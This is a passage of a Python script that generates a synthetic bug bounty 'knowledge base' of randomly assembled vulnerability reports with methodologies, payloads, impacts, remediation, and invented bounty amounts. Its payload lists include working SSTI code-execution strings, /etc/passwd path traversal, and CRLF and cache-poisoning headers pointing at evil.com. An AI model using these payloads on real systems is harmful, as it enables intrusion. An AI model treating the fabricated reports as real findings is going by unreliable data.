            "Map all endpoints that perform balance transfers or resource allocation",
            "Test for concurrent request handling using multi-threaded tools",
            "Analyze database transaction isolation levels",
            "Check for optimistic vs pessimistic locking mechanisms",
            "Test for double-spending or double-redemption",
            "Verify idempotency implementation in critical operations",
            "Document financial or resource impact of race conditions"
        ],
        "payloads": [
            "100 concurrent POST requests to /transfer endpoint",
            "50 concurrent requests to /redeem-coupon with same code",
            "20 concurrent requests to /vote for same option",
            "Simultaneous password reset requests",
            "Parallel account creation attempts"
        ],
        "impacts": [
            "Financial fraud through double-spending",
            "Coupon or discount code abuse",
            "Unauthorized resource allocation",
            "Data corruption from concurrent modifications",
            "Bypassing rate limits and quotas"
        ],
        "remediation": [
            "Implement database transactions with proper isolation levels",
            "Use pessimistic locking for critical operations",
            "Implement idempotency keys for state-changing operations",
            "Use atomic operations and compare-and-swap patterns",
            "Implement rate limiting at the application layer",
            "Use queue systems for sequential processing"
        ]
    },
    {
        "name": "Cache Poisoning",
        "severity_range": ["High", "Medium"],
        "bounty_base": {"High": 3000, "Medium": 1000},
        "technologies": ["CDN", "Reverse Proxy", "Various"],
        "methodologies": [
            "Identify cache behavior and cache key structure",
            "Test unkeyed inputs that affect cached responses",
            "Check for cache control header manipulation",
            "Map which headers and parameters are used as cache keys",
            "Test for XSS injection into cached responses",
            "Attempt to poison cache with malicious redirects",
            "Check for stored cache poisoning via reflected input",
            "Verify CDN and proxy configurations"
        ],
        "payloads": [
            "X-Forwarded-Host: evil.com", "X-Original-URL: /admin",
            "<script>alert(1)</script>", "http://evil.com",
            "Cache-Control: no-cache", "X-Cache: miss"
        ],
        "impacts": [
            "Serving malicious JavaScript to all users",
            "Redirecting all users to phishing pages",
            "XSS through cached responses",
            "Data theft via poisoned cache",
            "Reputation damage from cached malware"
        ],
        "remediation": [
            "Configure cache to use only safe, keyed inputs",
            "Remove or validate unkeyed headers",
            "Implement proper cache control headers",
            "Use Surrogate keys for cache invalidation",
            "Monitor cache behavior for anomalies",
            "Implement cache segmentation for sensitive content"
        ]
    },
    {
        "name": "Server-Side Template Injection (SSTI)",
        "severity_range": ["Critical", "High"],
        "bounty_base": {"Critical": 10000, "High": 5000},
        "technologies": ["Python", "Java", "Ruby", "Node.js", "PHP"],
        "methodologies": [
            "Inject template expressions to detect vulnerable parameters",
            "Identify the template engine being used",
            "Test for error-based detection by injecting invalid syntax",
            "Check for blind injection by observing response differences",
            "Escalate to RCE by accessing language-specific execution capabilities",
            "Bypass sandbox restrictions if present",
            "Test for file read/write capabilities via template injection",
            "Document the complete attack chain from detection to RCE"
        ],
        "payloads": [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>",
            "{{config.items()}}", "{{self.__class__.__mro__[1].__subclasses__()}}",
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
            "#{7*7}"
        ],
        "impacts": [
            "Remote code execution on the server",
            "Full server compromise",
            "Data theft from the filesystem",
            "Lateral movement to other systems",
            "Persistent backdoor installation"
        ],
        "remediation": [
            "Avoid using user input directly in template expressions",
            "Use sandboxed template engines where possible",
            "Implement proper input validation",
            "Use auto-escaping features of template engines",
            "Limit template engine capabilities in production",
            "Regular security testing of template rendering"
        ]
    },
    {
        "name": "Local File Inclusion (LFI)",
        "severity_range": ["High", "Medium"],
        "bounty_base": {"High": 3000, "Medium": 1000},
        "technologies": ["PHP", "Python", "Java", "Node.js"],
        "methodologies": [
            "Identify file path parameters in URLs and forms",
            "Test path traversal sequences to access parent directories",
            "Check for null byte injection to bypass file extension checks",
            "Test PHP wrappers for file read and code execution",
            "Attempt log poisoning to achieve RCE",
            "Check for file upload combined with LFI",
            "Test for local file disclosure via error messages",
            "Verify web server configuration for directory listing"
        ],
        "payloads": [
            "../../../etc/passwd", "....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "%00", "php://input", "/var/log/apache2/access.log"
        ],
        "impacts": [
            "Reading sensitive configuration files",
            "Exposing application source code",
            "Log poisoning leading to RCE",
            "Access to credentials and secrets",
            "Information disclosure for further attacks"
        ],
        "remediation": [
            "Validate and sanitize file paths against an allowlist",
            "Use chroot or containerization for file access",
            "Disable dangerous PHP wrappers",
            "Implement proper file permission controls",
            "Use parameterized file access functions",
            "Monitor for unusual file access patterns"
        ]
    },
    {
        "name": "CRLF Injection",
        "severity_range": ["Medium", "Low"],
        "bounty_base": {"Medium": 500, "Low": 200},
        "technologies": ["PHP", "Python", "Java", "Node.js", "Ruby", ".NET"],
        "methodologies": [
            "Inject CRLF sequences in URL parameters and headers",
            "Check for HTTP response splitting vulnerabilities",
            "Test header injection through user-controlled input",
            "Verify log injection possibilities",
            "Test redirect parameter manipulation",
            "Check for XSS via injected headers",
            "Test for cache poisoning through header injection",
            "Verify cookie injection possibilities"
        ],
        "payloads": [
            "%0d%0a", "%0D%0A", "\\r\\n",
            "%0d%0aInjected-Header:value",
            "%0d%0aSet-Cookie:session=evil",
            "%0d%0aLocation:http://evil.com"
        ],
        "impacts": [
            "HTTP response splitting attacks",
            "Cross-site scripting via header injection",
            "Session fixation through cookie injection",
            "Cache poisoning through header manipulation",
            "Log injection affecting security monitoring"
        ],
        "remediation": [
            "Encode or strip CRLF characters from user input",
            "Validate and sanitize all header values",
            "Use security headers to prevent response splitting",
            "Implement proper output encoding",
            "Use frameworks that auto-encode output",
            "Monitor for unusual header patterns"
        ]
    },
]

TECHNOLOGIES = ["PHP", "Python", "Java", "Node.js", "Ruby", ".NET", "Go"]
DIFFICULTY_LEVELS = ["Beginner", "Intermediate", "Advanced"]
DISCOVERY_TECHNIQUES = ["Manual", "Automated", "Combination"]
PLATFORMS = ["Web Application", "API", "Mobile Backend", "Cloud Service", "IoT", "Desktop Application"]

SEVERITY_WEIGHTS = {"Critical": 1, "High": 3, "Medium": 5, "Low": 3}

def generate_title(vuln_type, program_name, tech):
    titles = {
        "SQL Injection": [
            "SQL Injection in {program} {tech} Login Portal",
            "Blind SQL Injection in {program} Search API",
            "UNION-Based SQL Injection in {program} User Profile",
            "SQL Injection via {tech} ORM Bypass",
            "Stacked Queries SQL Injection in {program}",
            "Time-Based Blind SQLi in {program} Order System",
            "SQL Injection in {program} Export Functionality",
            "Second-Order SQL Injection in {program} Registration",
            "SQL Injection via {tech} Stored Procedures",
            "NoSQL Injection in {program} API",
        ],
        "Cross-Site Scripting (XSS)": [
            "Stored XSS in {program} User Profile",
            "Reflected XSS in {program} Search Functionality",
            "DOM-Based XSS in {program} Web Application",
            "Self-XSS Escalated to Stored XSS in {program}",
            "XSS via SVG Upload in {program}",
            "Mutation XSS in {program} Comment System",
            "XSS Bypass CSP in {program}",
            "Blind XSS in {program} Admin Panel",
            "XSS in {program} Email Templates",
            "XSS via Markdown Injection in {program}",
        ],
        "Server-Side Request Forgery (SSRF)": [
            "SSRF to AWS Metadata in {program}",
            "SSRF via URL Import Feature in {program}",
            "Blind SSRF Leading to Internal Network Scan",
            "SSRF Bypass in {program} Webhook System",
            "SSRF to Cloud Credentials in {program}",
            "SSRF via PDF Generator in {program}",
            "SSRF with DNS Rebinding in {program}",
            "SSRF to Internal Admin Panel",
            "SSRF via Thumbnail Generator in {program}",
            "SSRF with Protocol Smuggling in {program}",
        ],
        "Insecure Direct Object Reference (IDOR)": [
            "IDOR in {program} User Profile API",
            "IDOR Leading to Admin Data Access",
            "IDOR in {program} Document Download",
            "Horizontal IDOR Between User Accounts",
            "IDOR in {program} Invoice System",
            "IDOR via UUID Prediction in {program}",
            "IDOR in {program} Password Reset Flow",
            "IDOR Bypass via HTTP Method Change",
            "IDOR in {program} Mobile API",
            "Vertical IDOR to Admin Panel",
        ],
        "Remote Code Execution (RCE)": [
            "RCE via Command Injection in {program}",
            "RCE via Unsafe Deserialization in {program}",
            "RCE via SSTI in {program}",
            "RCE via File Upload in {program}",
            "RCE via eval() Injection in {program}",
            "RCE via Template Injection in {program}",
            "RCE via Log Poisoning in {program}",
            "RCE via Cron Job Injection in {program}",
            "RCE via Redis Injection in {program}",
            "RCE via YAML Deserialization in {program}",
        ],
        "Authentication Bypass": [
            "Authentication Bypass in {program} Login",
            "JWT Algorithm Confusion in {program}",
            "OAuth Token Theft in {program}",
            "Session Fixation in {program}",
            "Password Reset Bypass in {program}",
            "Two-Factor Authentication Bypass in {program}",
            "SAML Assertion Injection in {program}",
            "API Key Bypass in {program}",
            "SSO Authentication Bypass in {program}",
            "LDAP Injection for Auth Bypass in {program}",
        ],
        "Privilege Escalation": [
            "Vertical Privilege Escalation in {program}",
            "Horizontal Privilege Escalation in {program}",
            "Admin Panel Access via IDOR in {program}",
            "Role Manipulation in {program} API",
            "Privilege Escalation via Parameter Pollution",
            "Function-Level Access Control Bypass",
            "Privilege Escalation via JWT Claim Manipulation",
            "Admin Access via Missing Authorization",
            "Privilege Escalation via Mass Assignment",
            "Role Escalation in {program} Admin",
        ],
        "XML External Entity (XXE)": [
            "XXE in {program} File Upload",
            "XXE via SOAP API in {program}",
            "Blind XXE Leading to SSRF in {program}",
            "XXE in SVG File Upload",
            "XXE to Local File Read in {program}",
            "XXE via RSS Feed Parser in {program}",
            "XXE Bypass in {program} XML Processor",
            "XXE with Parameter Entities in {program}",
            "XXE via Document Import in {program}",
            "XXE Denial of Service in {program}",
        ],
        "Cross-Site Request Forgery (CSRF)": [
            "CSRF in {program} Password Change",
            "CSRF Leading to Account Takeover in {program}",
            "CSRF in {program} Email Change",
            "CSRF via Image Upload in {program}",
            "CSRF Bypass SameSite in {program}",
            "CSRF in {program} Fund Transfer",
            "CSRF via Subdomain XSS in {program}",
            "CSRF in {program} Admin Actions",
            "CSRF Token Bypass in {program}",
            "CSRF via Open Redirect in {program}",
        ],
        "File Upload": [
            "Unrestricted File Upload to RCE in {program}",
            "File Upload Bypass Leading to Stored XSS",
            "File Upload to Webshell in {program}",
            "Bypass File Type Validation in {program}",
            "File Upload with Double Extension Bypass",
            "File Upload to Server-Side Include",
            "File Upload with Null Byte Bypass",
            "File Upload to Directory Traversal",
            "File Upload with Content-Type Bypass",
            "File Upload Leading to DoS in {program}",
        ],
        "Subdomain Takeover": [
            "Subdomain Takeover via GitHub Pages",
            "Subdomain Takeover via Heroku",
            "Subdomain Takeover via AWS S3",
            "Subdomain Takeover via Netlify",
            "Subdomain Takeover via Fastly",
            "Subdomain Takeover via Shopify",
            "Subdomain Takeover via Tumblr",
            "Subdomain Takeover via Azure",
            "Subdomain Takeover via Pantheon",
            "Subdomain Takeover via Firebase",
        ],
        "Open Redirect": [
            "Open Redirect in {program} Login Flow",
            "Open Redirect Leading to Phishing in {program}",
            "Open Redirect via OAuth Callback in {program}",
            "Open Redirect Bypass in {program}",
            "Open Redirect via URL Parameter in {program}",
            "Open Redirect with Encoding Bypass",
            "Open Redirect in {program} Logout Flow",
            "Open Redirect via Parser Discrepancy",
            "Open Redirect in {program} Error Page",
            "Open Redirect via Double Encoding",
        ],
        "Business Logic": [
            "Business Logic Flaw in {program} Checkout",
            "Price Manipulation in {program} Store",
            "Coupon Reuse in {program} E-Commerce",
            "Race Condition in {program} Payment",
            "Quantity Manipulation in {program} Cart",
            "Business Logic Bypass in {program} Subscription",
            "Workflow Skip in {program} Application",
            "State Machine Flaw in {program}",
            "Business Logic Error in {program} API",
            "Promotional Abuse in {program} Platform",
        ],
        "JWT Vulnerabilities": [
            "JWT None Algorithm Bypass in {program}",
            "JWT Algorithm Confusion in {program}",
            "JWT Key Confusion Attack in {program}",
            "JWT Claim Manipulation in {program}",
            "JWT Token Forgery in {program}",
            "JWT Expiration Bypass in {program}",
            "JWT Storage Vulnerability in {program}",
            "JWT Injection in {program} Headers",
            "JWT Brute Force in {program}",
            "JWT Side-Channel Attack in {program}",
        ],
        "GraphQL": [
            "GraphQL Introspection Enabled in {program}",
            "GraphQL Injection in {program} API",
            "GraphQL Batch Query Abuse in {program}",
            "GraphQL Authorization Bypass in {program}",
            "GraphQL DoS via Nested Queries",
            "GraphQL Data Exposure in {program}",
            "GraphQL Mutation Authorization Bypass",
            "GraphQL SSRF in {program}",
            "GraphQL Information Disclosure",
            "GraphQL Rate Limiting Bypass",
        ],
        "Race Condition": [
            "Race Condition in {program} Payment",
            "Race Condition in {program} Coupon Redemption",
            "Race Condition in {program} Voting System",
            "Race Condition in {program} Account Creation",
            "Race Condition in {program} Password Reset",
            "Race Condition in {program} Balance Transfer",
            "Race Condition in {program} Reservation",
            "Race Condition in {program} Inventory",
            "Race Condition in {program} Token Generation",
            "Race Condition in {program} File Upload",
        ],
        "Cache Poisoning": [
            "Cache Poisoning via Unkeyed Header in {program}",
            "Cache Poisoning Leading to XSS in {program}",
            "Cache Poisoning via Open Redirect in {program}",
            "Cache Poisoning in {program} CDN",
            "Cache Poisoning via Host Header",
            "Cache Poisoning with Parameter Cloaking",
            "Cache Poisoning in {program} Reverse Proxy",
            "Cache Poisoning via Cookie Injection",
            "Cache Poisoning Leading to DoS",
            "Stored Cache Poisoning in {program}",
        ],
        "Server-Side Template Injection (SSTI)": [
            "SSTI Leading to RCE in {program}",
            "Jinja2 Template Injection in {program}",
            "SSTI Bypass Sandbox in {program}",
            "Freemarker Template Injection in {program}",
            "SSTI in Email Templates in {program}",
            "SSTI via User Profile in {program}",
            "SSTI in Report Generator in {program}",
            "SSTI via Custom Widget in {program}",
            "SSTI in CMS Template in {program}",
            "SSTI with Sandbox Escape in {program}",
        ],
        "Local File Inclusion (LFI)": [
            "LFI Leading to RCE in {program}",
            "LFI via Log Poisoning in {program}",
            "LFI to /etc/passwd in {program}",
            "LFI via PHP Wrapper in {program}",
            "LFI with Null Byte Bypass in {program}",
            "LFI in {program} File Viewer",
            "LFI via Language Selection in {program}",
            "LFI to Source Code Disclosure in {program}",
            "LFI with Path Traversal in {program}",
            "LFI via Include Parameter in {program}",
        ],
        "CRLF Injection": [
            "CRLF Injection Leading to XSS in {program}",
            "CRLF Injection in HTTP Headers",
            "CRLF Injection via URL Parameter in {program}",
            "CRLF Injection Leading to Cache Poisoning",
            "CRLF Injection in Redirect Parameter",
            "CRLF Injection via User-Agent in {program}",
            "CRLF Injection Leading to Session Fixation",
            "CRLF Injection with Encoding Bypass",
            "CRLF Injection in Log Files of {program}",
            "CRLF Injection via Cookie Parameter",
        ],
    }
    
    title_templates = titles.get(vuln_type, ["{vuln_type} Vulnerability in {program} {tech} Application"])
    template = random.choice(title_templates)
    return template.format(
        program=program_name.split(" ")[0],
        tech=tech
    )

def generate_description(vuln_type, severity, program_name, tech):
    descriptions = {
        "SQL Injection": [
            f"During a security assessment of {program_name}'s {tech}-based application, I discovered a SQL injection vulnerability that allowed unauthorized access to the database. The vulnerability was found in the user search functionality where input parameters were directly concatenated into SQL queries without proper sanitization.",
            f"While testing {program_name}'s web application, I identified a blind SQL injection vulnerability in the order tracking system. The application was vulnerable to time-based blind SQLi, allowing extraction of sensitive data including user credentials and personal information.",
            f"A SQL injection vulnerability was discovered in {program_name}'s API endpoint that handles product filtering. The vulnerability allowed UNION-based injection, enabling extraction of data from multiple database tables including user accounts and payment information."
        ],
        "Cross-Site Scripting (XSS)": [
            f"A stored cross-site scripting vulnerability was discovered in {program_name}'s user profile section. The vulnerability allowed injection of malicious JavaScript that would execute in the browsers of other users viewing the affected profile, potentially leading to session hijacking.",
            f"While analyzing {program_name}'s web application, I found a DOM-based XSS vulnerability in the search functionality. User input was reflected into the page without proper encoding, allowing execution of arbitrary JavaScript in the victim's browser context.",
            f"A reflected XSS vulnerability was identified in {program_name}'s error handling mechanism. Error messages included user-supplied input without encoding, enabling phishing attacks through crafted URLs."
        ],
        "Server-Side Request Forgery (SSRF)": [
            f"An SSRF vulnerability was discovered in {program_name}'s webhook configuration feature. The application made server-side requests to user-specified URLs without proper validation, allowing access to internal services including cloud metadata endpoints.",
            f"During testing of {program_name}'s file import functionality, I found that the URL-based import feature was vulnerable to SSRF. The vulnerability allowed access to internal network resources and AWS instance metadata.",
            f"A blind SSRF vulnerability was identified in {program_name}'s URL preview feature. While responses were not directly visible, the timing differences allowed internal network enumeration and service discovery."
        ],
        "Insecure Direct Object Reference (IDOR)": [
            f"An IDOR vulnerability was discovered in {program_name}'s user profile API. By manipulating the user_id parameter, I was able to access and modify other users' profiles without authorization, including admin accounts.",
            f"While testing {program_name}'s document management system, I found that document IDs were sequential and predictable. This allowed access to other users' confidential documents by simply incrementing the ID parameter.",
            f"An IDOR vulnerability in {program_name}'s order history endpoint allowed horizontal privilege escalation. By changing the order_id parameter, I could view orders belonging to other users, including their shipping addresses and payment information."
        ],
        "Remote Code Execution (RCE)": [
            f"A critical RCE vulnerability was discovered in {program_name}'s admin panel through command injection. User-supplied input in the system diagnostics feature was passed directly to shell commands, allowing arbitrary code execution on the server.",
            f"During a security assessment of {program_name}'s {tech} application, I identified an unsafe deserialization vulnerability. The application deserialized user-controlled data without validation, enabling remote code execution through crafted payloads.",
            f"A server-side template injection vulnerability was found in {program_name}'s report generation feature. The vulnerability could be escalated to RCE by accessing the underlying template engine's execution capabilities."
        ],
        "Authentication Bypass": [
            f"An authentication bypass vulnerability was discovered in {program_name}'s login system. The vulnerability allowed bypassing the authentication mechanism through manipulation of the JWT token's algorithm field, granting access to admin functionality.",
            f"While testing {program_name}'s OAuth implementation, I found a redirect_uri validation bypass that allowed stealing authorization tokens. The vulnerability could be exploited to take over any user account.",
            f"A session fixation vulnerability was identified in {program_name}'s authentication flow. The application accepted session IDs from client-side input, allowing attackers to hijack user sessions."
        ],
        "Privilege Escalation": [
            f"A privilege escalation vulnerability was found in {program_name}'s user management API. By manipulating the 'role' parameter during profile updates, I could escalate from a regular user to administrator, gaining access to all system functionality.",
            f"While testing {program_name}'s {tech} application, I discovered that the function-level authorization was missing on admin endpoints. This allowed any authenticated user to access admin functionality by directly calling the API endpoints.",
            f"An IDOR vulnerability in {program_name}'s admin panel allowed horizontal privilege escalation. By changing the user_id parameter, I could access and modify admin accounts without proper authorization."
        ],
        "XML External Entity (XXE)": [
            f"An XXE vulnerability was discovered in {program_name}'s file upload feature that accepts XML files. The XML parser was configured to process external entities, allowing reading of local files including /etc/passwd and application configuration.",
            f"During testing of {program_name}'s SOAP API, I found that the XML parser was vulnerable to XXE attacks. The vulnerability allowed accessing internal files and performing SSRF to cloud metadata endpoints.",
            f"An XXE vulnerability was identified in {program_name}'s SVG file upload. Uploaded SVGs containing XXE payloads could read local files and exfiltrate data via out-of-band channels."
        ],
        "Cross-Site Request Forgery (CSRF)": [
            f"A CSRF vulnerability was found in {program_name}'s email change functionality. The application did not implement proper anti-CSRF tokens, allowing an attacker to change a victim's email address through a crafted page.",
            f"While testing {program_name}'s {tech} application, I discovered that the password change endpoint lacked CSRF protection. Combined with an open redirect, this could be used for account takeover.",
            f"A CSRF vulnerability in {program_name}'s fund transfer feature could lead to financial fraud. The application used GET requests for state-changing operations without anti-CSRF tokens."
        ],
        "File Upload": [
            f"An unrestricted file upload vulnerability was discovered in {program_name}'s profile picture upload. By bypassing file type validation, I could upload a PHP webshell and achieve remote code execution on the server.",
            f"While testing {program_name}'s document management system, I found that the file upload validation could be bypassed using double extensions and Content-Type manipulation, leading to stored XSS and potential code execution.",
            f"A file upload vulnerability was identified in {program_name}'s import functionality. The application did not properly validate uploaded files, allowing upload of executable scripts that could be accessed directly via the web server."
        ],
        "Subdomain Takeover": [
            f"A subdomain takeover vulnerability was discovered in {program_name}'s DNS configuration. The subdomain blog.{program_name}.com was pointing to an unclaimed GitHub Pages repository, allowing an attacker to take control of the subdomain.",
            f"While analyzing {program_name}'s infrastructure, I found that several subdomains were pointing to unclaimed Heroku applications. This could be exploited for phishing attacks using the trusted domain.",
            f"An unclaimed AWS S3 bucket was found to be associated with {program_name}'s media subdomain. By claiming the bucket, an attacker could serve malicious content from the trusted domain."
        ],
        "Open Redirect": [
            f"An open redirect vulnerability was found in {program_name}'s login redirect mechanism. The 'next' parameter accepted arbitrary URLs, allowing phishing attacks through the trusted domain.",
            f"While testing {program_name}'s OAuth flow, I discovered that the callback URL parameter was vulnerable to open redirect, potentially allowing OAuth token theft through crafted URLs.",
            f"An open redirect vulnerability was identified in {program_name}'s error pages. The redirect parameter could be manipulated to send users to malicious external sites."
        ],
        "Business Logic": [
            f"A business logic vulnerability was discovered in {program_name}'s checkout process. By manipulating the price parameter during the transaction, I could purchase items for negative amounts, effectively receiving refunds for unauthorized purchases.",
            f"While testing {program_name}'s e-commerce platform, I found that coupon codes could be reused multiple times by manipulating the redemption state. This allowed unlimited discounts on any purchase.",
            f"A race condition in {program_name}'s payment system allowed double-spending. By sending concurrent payment requests, I could complete multiple purchases while only being charged once."
        ],
        "JWT Vulnerabilities": [
            f"A JWT vulnerability was found in {program_name}'s authentication system. The application accepted the 'none' algorithm, allowing token forgery and complete authentication bypass.",
            f"While analyzing {program_name}'s JWT implementation, I discovered an algorithm confusion vulnerability. By switching from RS256 to HS256 and using the public key as the secret, I could forge admin tokens.",
            f"An insecure JWT storage vulnerability was identified in {program_name}'s web application. JWT tokens were stored in localStorage, making them accessible to XSS attacks."
        ],
        "GraphQL": [
            f"A GraphQL introspection vulnerability was found in {program_name}'s API. The entire schema was exposed, revealing sensitive queries and mutations that could be exploited for unauthorized data access.",
            f"While testing {program_name}'s GraphQL API, I discovered that authorization was not enforced on nested queries. This allowed bypassing access controls by querying related objects through authorized endpoints.",
            f"A batch query abuse vulnerability was identified in {program_name}'s GraphQL API. The lack of query complexity limits allowed denial of service through computationally expensive queries."
        ],
        "Race Condition": [
            f"A race condition was discovered in {program_name}'s coupon redemption system. By sending concurrent requests, I could redeem the same coupon code multiple times, effectively doubling the discount.",
            f"While testing {program_name}'s voting system, I found a race condition that allowed casting multiple votes by exploiting the time window between vote counting and database update.",
            f"A race condition in {program_name}'s balance transfer feature allowed double-spending. The application did not properly lock the account balance during concurrent transactions."
        ],
        "Cache Poisoning": [
            f"A cache poisoning vulnerability was found in {program_name}'s CDN configuration. By manipulating unkeyed headers, I could poison the cache with malicious content affecting all users.",
            f"While testing {program_name}'s web application, I discovered that the X-Forwarded-Host header was not properly keyed in the cache. This allowed XSS injection that would be served to all users.",
            f"A stored cache poisoning vulnerability was identified in {program_name}'s comment system. Malicious content stored in comments could be cached and served to other users."
        ],
        "Server-Side Template Injection (SSTI)": [
            f"A server-side template injection vulnerability was discovered in {program_name}'s report generation feature. User input was directly embedded in Jinja2 templates, allowing template expression injection and potential RCE.",
            f"While testing {program_name}'s {tech} application, I found that the email template engine was vulnerable to SSTI. The vulnerability could be escalated to remote code execution by accessing Python's import mechanism.",
            f"An SSTI vulnerability was identified in {program_name}'s custom widget system. The template engine processed user-controlled content without proper sandboxing, leading to code execution."
        ],
        "Local File Inclusion (LFI)": [
            f"A local file inclusion vulnerability was found in {program_name}'s file viewer. The include parameter was not properly sanitized, allowing path traversal to read sensitive files including /etc/passwd and application configuration.",
            f"While testing {program_name}'s web application, I discovered an LFI vulnerability that could be escalated to RCE through log poisoning. By injecting PHP code into user-agent headers and including the log file, I achieved code execution.",
            f"An LFI vulnerability was identified in {program_name}'s language selection feature. The vulnerability allowed reading any file on the server through PHP wrapper abuse."
        ],
        "CRLF Injection": [
            f"A CRLF injection vulnerability was discovered in {program_name}'s redirect parameter. By injecting CRLF characters, I could perform HTTP response splitting and inject arbitrary headers, leading to XSS and cache poisoning.",
            f"While testing {program_name}'s web application, I found that the URL parameter was vulnerable to CRLF injection. This allowed header injection and potential session fixation attacks.",
            f"A CRLF injection vulnerability was identified in {program_name}'s log viewer. User input was not properly encoded before being written to log files, allowing log injection and potential XSS when logs are viewed."
        ]
    }
    
    return random.choice(descriptions.get(vuln_type, [f"A {vuln_type} vulnerability was discovered in {program_name}'s application."]))

def generate_entry(vuln_type_info, entry_id):
    vuln_type = vuln_type_info["name"]
    program = random.choice(PROGRAMS)
    severity = random.choice(vuln_type_info["severity_range"])
    tech = random.choice(vuln_type_info["technologies"])
    difficulty = random.choice(DIFFICULTY_LEVELS)
    discovery = random.choice(DISCOVERY_TECHNIQUES)
    platform = random.choice(PLATFORMS)
    
    base_bounty = vuln_type_info["bounty_base"].get(severity, 1000)
    bounty_variance = random.uniform(0.7, 1.3)
    bounty = int(base_bounty * bounty_variance)
    
    methodology = random.sample(
        vuln_type_info["methodologies"], 
        min(len(vuln_type_info["methodologies"]), random.randint(3, 6))
    )
    
    payload_count = random.randint(2, min(5, len(vuln_type_info["payloads"])))
    payloads = random.sample(vuln_type_info["payloads"], payload_count)
    
    impact_count = random.randint(2, min(4, len(vuln_type_info["impacts"])))
    impacts = random.sample(vuln_type_info["impacts"], impact_count)
    
    remediation_count = random.randint(3, min(6, len(vuln_type_info["remediation"])))
    remediation = random.sample(vuln_type_info["remediation"], remediation_count)
    
    title = generate_title(vuln_type, program["name"], tech)
    description = generate_description(vuln_type, severity, program["name"], tech)
    
    return {
        "id": entry_id,
        "title": title,
        "vulnerability_type": vuln_type,
        "severity": severity,
        "bounty_amount_usd": bounty,
        "program": program["name"],
        "platform": program["platform"],
        "technology": tech,
        "target_platform": platform,
        "difficulty_level": difficulty,
        "discovery_technique": discovery,
        "description": description,
        "methodology": methodology,
        "payloads_used": payloads,
        "impact_assessment": impacts,
        "remediation_advice": remediation,
        "tags": [vuln_type.lower().replace(" ", "_"), tech.lower(), program["platform"].lower()],
        "metadata": {
            "report_date": (datetime.now() - timedelta(days=random.randint(1, 730))).strftime("%Y-%m-%d"),
            "time_to_find_hours": random.randint(1, 168),
            "scope": random.choice(["Full Application", "Limited Scope", "Specific Endpoint"]),
            "authentication_required": random.choice([True, True, True, False]),
            "chainable": random.choice([True, False, False]),
            "cvss_estimate": round(random.uniform(3.0, 10.0), 1)
        }
    }

def generate_all_entries():
    entries = []
    entry_id = 1
    
    entries_per_type = {}
    
    for vuln_type_info in VULN_TYPES:
        vuln_name = vuln_type_info["name"]
        target_count = random.randint(50, 75)
        entries_per_type[vuln_name] = 0
        
        for _ in range(target_count):
            entry = generate_entry(vuln_type_info, entry_id)
            entries.append(entry)
            entry_id += 1
            entries_per_type[vuln_name] += 1
    
    return entries, entries_per_type

def generate_summary(entries, entries_per_type):
    total_bounty = sum(e["bounty_amount_usd"] for e in entries)
    
    severity_dist = {}
    for e in entries:
        sev = e["severity"]
        severity_dist[sev] = severity_dist.get(sev, 0) + 1
    
    tech_dist = {}
    for e in entries:
        tech = e["technology"]
        tech_dist[tech] = tech_dist.get(tech, 0) + 1
    
    difficulty_dist = {}
    for e in entries:
        diff = e["difficulty_level"]
        difficulty_dist[diff] = difficulty_dist.get(diff, 0) + 1
    
    discovery_dist = {}
    for e in entries:
        disc = e["discovery_technique"]
        discovery_dist[disc] = discovery_dist.get(disc, 0) + 1
    
    return {
        "total_entries": len(entries),
        "total_bounty_simulated_usd": total_bounty,
        "average_bounty_usd": total_bounty // len(entries),
        "vulnerability_type_distribution": entries_per_type,
        "severity_distribution": severity_dist,
        "technology_distribution": tech_dist,
        "difficulty_distribution": difficulty_dist,
        "discovery_technique_distribution": discovery_dist,
        "unique_programs": len(set(e["program"] for e in entries)),
        "unique_technologies": list(tech_dist.keys()),
        "generation_timestamp": datetime.now().isoformat()
    }

def main():
    print("=" * 60)
    print("Bug Bounty Knowledge Base Generator")
    print("=" * 60)
    
    print("\n[1/4] Generating 1000+ learning entries...")
    entries, entries_per_type = generate_all_entries()
    
    print(f"[2/4] Writing {len(entries)} entries to knowledge_base.json...")
    knowledge_base_path = os.path.join(OUTPUT_DIR, "knowledge_base.json")
    with open(knowledge_base_path, "w", encoding="utf-8") as f:
        json.dump(entries, f, indent=2, ensure_ascii=False)
    
    print("[3/4] Generating summary statistics...")
    summary = generate_summary(entries, entries_per_type)
    summary_path = os.path.join(OUTPUT_DIR, "generation_summary.json")
    with open(summary_path, "w", encoding="utf-8") as f:
        json.dump(summary, f, indent=2, ensure_ascii=False)
    
    print("[4/4] Generating quick access index...")
    index = {}
    for entry in entries:
        vtype = entry["vulnerability_type"]
        if vtype not in index:
            index[vtype] = []
        index[vtype].append({
            "id": entry["id"],
            "title": entry["title"],
            "severity": entry["severity"],
            "bounty": entry["bounty_amount_usd"],
            "program": entry["program"]
        })
    
    index_path = os.path.join(OUTPUT_DIR, "knowledge_index.json")
    with open(index_path, "w", encoding="utf-8") as f:
        json.dump(index, f, indent=2, ensure_ascii=False)
    
    print("\n" + "=" * 60)
    print("GENERATION COMPLETE")
    print("=" * 60)
    
    print(f"\nTotal entries generated: {summary['total_entries']}")
    print(f"Total simulated bounty value: ${summary['total_bounty_simulated_usd']:,}")
    print(f"Average bounty per entry: ${summary['average_bounty_usd']:,}")
    print(f"Unique programs covered: {summary['unique_programs']}")
    print(f"Technologies covered: {', '.join(summary['unique_technologies'])}")
    
    print("\nEntries by vulnerability type:")
    for vtype, count in sorted(entries_per_type.items(), key=lambda x: -x[1]):
        print(f"  {vtype}: {count} entries")
    
    print("\nSeverity distribution:")
    for sev, count in sorted(summary["severity_distribution"].items()):
        print(f"  {sev}: {count}")
    
    print("\nDifficulty distribution:")
    for diff, count in sorted(summary["difficulty_distribution"].items()):
        print(f"  {diff}: {count}")
    
    print("\nFiles generated:")
    print(f"  - knowledge_base.json ({len(entries)} entries)")
    print(f"  - generation_summary.json")
    print(f"  - knowledge_index.json")
    
    return summary

if __name__ == "__main__":
    main()
